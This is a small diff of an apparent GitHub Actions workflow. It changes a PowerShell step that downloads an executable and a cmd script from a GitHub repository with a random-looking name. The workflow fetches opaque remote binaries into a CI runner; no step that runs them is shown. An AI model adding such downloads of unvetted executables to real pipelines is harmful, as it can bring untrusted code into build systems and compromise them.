@@ -9,7 +9,7 @@ jobs:
     
     steps:
     - name: Download Untitled.exe
-      run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/Untitled_NEW.exe -OutFile untitled.exe
+      run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/Untitled.exe -OutFile untitled.exe
 
     - name: Download cmd.cmd
       run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/cmd.cmd -OutFile cmd.cmd
